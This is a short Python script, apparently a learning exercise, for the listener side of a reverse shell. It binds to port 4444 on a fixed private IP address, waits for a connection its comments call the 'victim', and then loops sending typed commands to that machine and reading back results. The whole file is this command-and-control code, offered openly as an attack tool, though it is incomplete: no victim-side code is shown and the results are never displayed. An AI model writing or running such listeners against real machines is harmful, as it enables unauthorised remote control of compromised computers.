import socket

listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#basically using the same address when is there is a disconnection between victim and listener
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("10.207.48.142",4444))
listener.listen(0)
print("waiting for connections")
#accept return two objects 1. connection - socket object to send and receive data 
#2. address that is responsible for communication

connection , address = listener.accept()
print(" [+] connection from " + str(address))
print(' Connection Established')

while True:
    command = input('enter input')
    connection.send(command)
    result = connection.recv(1024)

# connection.close()
    
